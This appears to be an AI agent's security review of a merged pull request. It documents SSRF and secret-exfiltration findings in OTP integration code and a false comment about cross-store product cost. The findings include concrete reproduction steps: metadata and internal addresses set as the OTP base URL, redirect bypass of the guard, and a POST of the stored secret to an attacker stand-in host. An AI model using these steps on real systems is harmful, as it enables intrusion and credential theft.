# Targeted retrospective security review of PR #124, on `main`

Owner direction of 2026-11-02, **Decision 1**: *"Preserve the merge and perform a targeted
retrospective review of its security-sensitive changes on `main`. Do not revert working code
without a demonstrated material defect. Document the review evidence and any remaining findings."*

**Nothing in this document changes code.** It is the evidence and the finding list.

---

## 1. What was reviewed, and how

| | |
|---|---|
| merge under review | `230d2e12` (PR #124), merge base `a5a9d7a2` |
| surfaces | the six non-test, non-doc files the merge touched — `OrderFinancialService.php`, `OtpIntegrationController.php`, `OrderController.php`, `Api/DashboardController.php`, `DeliveryBoyNotificationController.php`, `routes/web.php` |
| method | four independent adversarial reviewers, one per surface, each instructed to **refute** the change; every claim then handed to a **separate** verifier instructed to show it **wrong** and to classify materiality itself |
| threshold | the owner's own: a **material defect** is something wrong with a concrete failure path. An observation or latent risk cannot justify touching merged code |
| result | **25 claims, 24 confirmed real, 1 refuted.** 4 material defects, 8 latent risks, 12 observations |

**Three of the four material defects would justify a change. One would not, and the distinction is
load-bearing** — the code it concerns is correct and must not be reverted; only the claims *about*
it are wrong.

### What this review is not

It is an **agent** review. It is not, and must not be recorded as, the independent human review the
owner withheld in Decision 1 (*"Do not retroactively classify its security checklist as
independently human-reviewed"*). It is input to such a review.

---

## 2. Material defect 1 — the guard added by #124 is bypassable by redirect. **This one is mine.**

**Surface:** `app/Http/Controllers/OtpIntegrationController.php:177`, sends at `:296` and `:337`.

`SafeWebhook::allows()` is **verdict-only**. `app/Services/SafeWebhook.php:35-38` — `allows()` is
`plan() !== null`, a bool. It resolves and judges the *initial* host, then returns; **it pins
nothing and hands the caller no pinned URL.**

The sends are then made with a bare `Http::asMultipart()->timeout(20)->post($baseUrl . '/api/send/…')`
— no `CURLOPT_RESOLVE` pin, no `allow_redirects => false`. Laravel's `PendingRequest` sets no
redirect options (`PendingRequest.php:232-237`), so Guzzle applies its defaults: follow up to 5
redirects. **A 307 preserves the method and the body.**

**Measured in the booted application**, with this controller's exact idiom: a local first hop
returned `307 Location: <second hop>`; the client **followed it** and delivered the identical
562-byte multipart body — **including the `secret` field** — to the second hop, with
`effectiveUri` the second hop.

So a **public** first hop that passes `allows()` can `307`-redirect the POST, carrying the store's
stored `api_secret`, to an internal or metadata address that `allows()` itself refuses. DNS
rebinding is the same hole by a second route: `allows()` resolves the name, the HTTP client
resolves it again.

**The pinning half exists in this codebase and is used elsewhere.** `SafeWebhook::send()`
(`SafeWebhook.php:84-93`) sets `CURLOPT_RESOLVE` **and** `CURLOPT_FOLLOWLOCATION => false`, and
`app/Models/Utility.php:2119` calls it. #124 called `allows()` and then issued its own
`Http::post()`.

> **This is a defect in the merged hunk, authored by this workstream.** The fix narrowed the
> surface — see §5 — but it did not close it, and the queue's claim that it was *"Fixed with the
> guard this codebase already has"* is therefore too strong.

**Remedy (not applied):** route the two sends through `SafeWebhook::send()`, which pins the
resolved address and refuses redirects, instead of a bare `Http::post()` after a bool check.

---

## 3. Material defect 2 — the guarded send was never the only send

**Surface:** `app/Http/Controllers/Customer/Auth/CustomerLoginController.php`, sends at `:202` and
`:290`, reached by `sendPasswordOtp()`.

A census of `api_secret` across `app/` and `packages/` finds **exactly four outbound sends**: two in
`OtpIntegrationController` (now guarded) and two in `CustomerLoginController` (**unguarded** — the
file contains no `SafeWebhook` or `SafeRemoteFetch` reference at all). The API reset path
`Api\AuthController::forgot_password_send_otp` sends e-mail and never touches `OtpIntegration`;
`SettingController:2147` only renders. **There is no fifth sender.**

`CustomerLoginController` reads `$integration->base_url` from the stored row and posts
`$integration->api_secret` to it. Measured:

| step | measured |
|---|---|
| `Str::isUrl()` accepts | `http://169.254.169.254`, `http://127.0.0.1`, `http://10.0.0.5:6379`, `http://[::1]`, `http://metadata.google.internal` |
| `POST /otp-integration` with `base_url=http://169.254.169.254&is_active=1`, as a merchant | **302**, row persisted |
| the trigger route `POST {storeSlug?}/forgot-password/otp/send` | middleware `web, ActiveTheme, ThemeLanguage, ThrottleRequests:auth` — **no auth** |
| a POST with **no session and no token**, body `mobile=…` | one outbound request: `POST http://169.254.169.254/api/send/sms`, multipart field `secret=<the store's own OTP secret>` |
| the rate limit | `throttle:auth` keys on ip + `sha256(email)`; this route posts `mobile`, so the bucket is 10/min **per IP** — a cap, not a control |
| error reflection to the anonymous caller | a remote body surfaced as `session('error') = 'INTERNAL-SERVICE-BANNER: redis 7.0.11 on 127.0.0.1'`; a `ConnectionException` surfaced as `'cURL error 7: … port 6379 … Connection refused'` |

**Positive control** (so the asymmetry is attributable to the missing guard, not an early return):
the guarded `test()` refuses the same stored host — `{"success":false,"message":"That OTP provider
address is not allowed…"}` with `Http::assertNothingSent()`.

### Severity, stated without inflation

**Setting the address requires an authenticated staff account of that store.** Once set, the
trigger is **anonymous**, and the error reflection is an **anonymous internal-network port
oracle**. It is **not cross-tenant**: `save()` uses `getCurrentStore()` and no handler was found
that writes `current_store` from caller input, and the read is `where('store_id', $store->id)`. So
it sits **below** this repository's S1/S2 cross-tenant class: *staff of store A, holding no
permissions, redirect store A's own OTP credential — and anyone may then fire it and read back
errors about the platform's internal network.*

**Remedy (not applied):** the same `SafeWebhook::send()` treatment on both sends in
`CustomerLoginController`, and stop reflecting transport errors to an unauthenticated caller.

---

## 4. Material defect 3 — a zero-permission staff user can exfiltrate the stored secret

**Surface:** `OtpIntegrationController::test()` at `:112`, `save()` at `:21`, routes
`routes/web.php:345-353`.

Reproduced with a probe of 3 tests / 17 assertions: a user of `type === 'staff'` — **not** admin,
**not** super admin, with `isAbleTo()` false for four permission names, `current_store` equal to
the store — POSTs `/otp-integration/test` with `base_url=https://attacker.example.test` and
receives **HTTP 200 `{"success":true}`** while an outbound `POST
https://attacker.example.test/api/send/sms` carries the **stored** secret in its multipart body.

Confirmed alongside: `grep -nE "isAbleTo|authorize\(|->can\(|@can|middleware\("` on the controller
**exits 1 — zero hits**; all three routes carry exactly `web|Authenticate|XSS|SetLocate|EmailIsVerified`;
`allows()` permits ports 25, 6379, 0 and 9200 because `SafeWebhook::plan()` passes `$anyPort=true`;
and `resources/views/setting/otp_setting.blade.php` renders `api_secret` as `type="password"` with
no `value`, **so the masking is a real control that `test()` defeats.**

**Remedy (not applied, and reserved):** an operator-first `isAbleTo` gate on `save()` and `test()`.
This changes **who may save merchant settings**, which is a business-rule change the owner reserves.

---

## 5. Three corrections this review forced on the record, two of them to claims of mine

Recorded as prominently as the findings, because a review that only produces findings is a review
that flatters its author.

**(a) The permission gap was already disclosed, and my report of it implied otherwise.**
`P01-SECURITY-WORK-QUEUE.md:4617-4620` says, in #124's own write-up: *"**Still open and NOT changed
here:** that route carries no permission check, only `['auth','xss','setlocate','verified']` …
adding an authorization gate is a different decision from closing an SSRF."* That is accurate and
it predates this review. §4 is a reproduction of a **disclosed** gap, not a discovery.

**(b) The merge strictly narrowed the surface.** `git diff a5a9d7a2 230d2e12` on that file adds
**only** the `SafeWebhook::allows()` block. Before it there was no check at all and direct internal
addresses were accepted. **#124 improved this surface; it did not create the problem.**

**(c) But "P1-SEC-45 CLOSED" was still too strong,** for two reasons neither disclosed at the time:
the guard is redirect- and rebinding-bypassable (§2), and the *second, unguarded* egress of the same
secret was never mentioned (§3). The honest status is **partially closed**.

---

## 6. Material defect 4 — a false premise, on which `P1-SEC-44` was marked CLOSED. **Would NOT justify a change.**

**Surface:** `app/Services/OrderFinancialService.php:228-233` and the forward-only shape at `:28-35`.

The merged comment asserts: *"Until 2026-11-02 the persistence threw … AND `$product->cost_price`
was null … Both became real on the same day."* **This repository's own measured production dump
refutes both halves**, in a table headed *"The three claims the dump refuted"*:

| source | says |
|---|---|
| `docs/GATE-F-VERIFIED-SCHEMA.md:77` | *"All 15 tables exist in production, with live data … `store_order_financials` 92 P&L rows … **The service does not throw. The subsystem is running, and has been.**"* |
| `:79` | *"It exists, `decimal(15,2) NOT NULL DEFAULT 0.00`, **populated on all 45 products**."* |
| `database/migrations/2026_10_26_000100_add_cost_price_to_products_table.php:34` | *"89 of 92 `store_order_financials` rows carry `product_cost = 0`"* — so **3 production rows already carry a non-zero `product_cost`**, computed by the unscoped `Product::find()` |

The same refuted premise is repeated in `P01-SECURITY-WORK-QUEUE.md:4579` and, more strongly, in
`tests/Feature/Security/GateFActivatedSurfacesTest.php:16`: *"ALL FOUR WENT LIVE ON 2026-11-02."*

**This is the exact failure mode `CLAUDE.md` §1 elevates** — *"The migrations are not the schema …
the restored dump refuted it."* The repository built a document to stop that inference being
repeated, and the merged change repeated it.

**Reproduced by execution** that the fix has no path to pre-existing rows: a planted pre-fix row
(a store-A order naming store-B's 77.00 product at qty 2 → `product_cost` 154.00, `gross_profit`
46.00) survives `createForOrder()` (early return at `:28-35`), survives paid and unpaid
transitions through `OrderObserver`, and `GET /finance` as the store-A merchant renders **154.00**.
All three update sites (`:314`, `:392`, `:561`) write only payment fields — verified by reading
each.

**And `DEPLOYED` is `NO`**, so production is running the **pre-fix** unscoped `Product::find()`
now. The leak is not historical; it is live and accumulating — while the merged comment tells the
next reader it only became possible on 2026-11-02.

### Why this does not justify touching the merged code

**The store predicate itself is correct and verified working. It must not be reverted.** The remedy
is entirely additive:

1. correct the three false statements (the service comment, the queue, the test docblock);
2. qualify `P1-SEC-44` as **closed forward, not reconciled backward**;
3. **one bounded, read-only production query** — `SELECT id, order_id, store_id, product_cost FROM
   store_order_financials WHERE product_cost <> 0`, then check each order's product ids against
   `products.store_id`. The candidate set is **3 of 92 rows**. **This workstream has no production
   access; the query is the owner's.**

Whether any of those 3 rows actually names a foreign product is **not established** and is not
claimed here.

---

## 7. Latent risks and observations — the remaining 20, in brief

Confirmed real, none meeting the material-defect threshold. Listed so none is lost.

| # | surface | finding |
|---|---|---|
| L1 | `OrderFinancialService:241` | the hand-rolled tenant predicate **fails open on a null `store_id`** rather than closed |
| L2 | `OtpIntegrationController:116-141` | `test()` validates only `phone`; `base_url` has **no type rule** (`save()` at least has `required\|url`) |
| L3 | `routes/web.php:345-347` | `POST /otp-integration/test` has **no rate limiter** — an unbounded server-side outbound-request driver |
| L4 | `OrderController` / `Api/DashboardController` | the commission check-then-insert **is a genuine race**; nothing in the schema or either handler serialises it |
| L5 | same | the guard is **forward-only**, so any pre-existing duplicate is permanent |
| L6 | `Api/DashboardController` | the `cost_price` omission creates a **lossy round-trip** a sibling handler does not prevent |
| L7 | `routes/web.php:1759` | the `$storeId` truthiness guard is **bypassed by a non-scalar `store_id`**, and the comment's claim about `0` is incomplete |
| L8 | `routes/web.php:1745` | the case-insensitive uninstall warning's haystack is `json_encode(...)`, so it **cannot see the header channel** it was added for |
| O1–O12 | various | `allows()` permits any port; the validator judges `$baseUrl` while the request goes to `$baseUrl . '/api/send/sms'`; `save1()` is dead unrouted code with the same weak validation; the P1-SEC-44 comment's arithmetic justification is wrong; neither shipped P1-SEC-44 test exercises the profit arithmetic; the commission comment overstates reachability; the API handler still stamps `deliveryboy_id` from the raw request; all four `Unauthorized` refusals pass `401` as `error()`'s **`$message`** rather than `$code`; the notification refusal branch is now unreachable; two `CLAUDE.md` statements about `scoped_models` are imprecise |

**`index()` is dead, not exposed** — a reviewer claimed every authenticated user can read the OTP
settings page; `View::exists('otp.integration')` is **false** and `GET /otp-integration` measures
**HTTP 500**. The real panel is `setting.otp_setting` on another route. Recorded because the
correction matters.

### The one claim refuted

That a duplicate commission *"is never replaced, updated or reconciled … the driver's
`total_earning` stays overstated indefinitely."* **False, by measurement.** The cleanup at
`OrderController.php:2371` and `Api/DashboardController.php:9432` is
`DeliveryEarning::where('order_id', $order->id)->delete()` — keyed on the **order**, not the driver
— so a genuine reassignment collapses N rows to one. Driven through the real web route with the
legacy state seeded (2 rows, 4.00 owed where 2.00 is correct): three same-driver POSTs left
`rows=2 owed=4.00`; **one driver change gave `rows=1 owed=2.00`.** A legacy duplicate is reconciled
by ordinary merchant action, and the merged guard additionally stops it growing.

---

## 8. What remains necessary, and who owns it

**Nothing in §§2–7 was fixed.** Per Decision 1 this document is the deliverable; the remedies are
listed so they can be authorised, not applied.

| # | item | owner |
|---|---|---|
| 1 | **Authorise the SSRF hardening** — route all four `api_secret` sends through `SafeWebhook::send()` (DNS-pinned, redirects refused) instead of a bool check plus a bare `Http::post()`, and stop reflecting transport errors to an unauthenticated caller. **Refuses unsafe destinations only; changes no permission and no legitimate flow.** | owner to authorise; this workstream can prepare it |
| 2 | **Decide the permission gate** on `save()` and `test()`. **Changes who may save merchant settings** — a business-rule change | **owner** |
| 3 | **Run one bounded read-only production query** for §6 (3 candidate rows). No production access here | **owner** |
| 4 | **Correct the three false premise statements** and qualify `P1-SEC-44` as closed-forward | this workstream, as documentation |
| 5 | Triage L1–L8 | owner to prioritise |

### Unchanged by this review

`DEPLOYED` is **NO** and `RELEASE READY` is **NO**. Incident **#120** and `P1-OWN-09` remain
**OWNER-DEFERRED / OPEN**. **P1-SEC-43** remains **OPEN and deployment-blocking**. No production
migration, no payment-provider activation, and **PR #124's merge is preserved** — no revert is
proposed, and §6 explicitly argues against one.
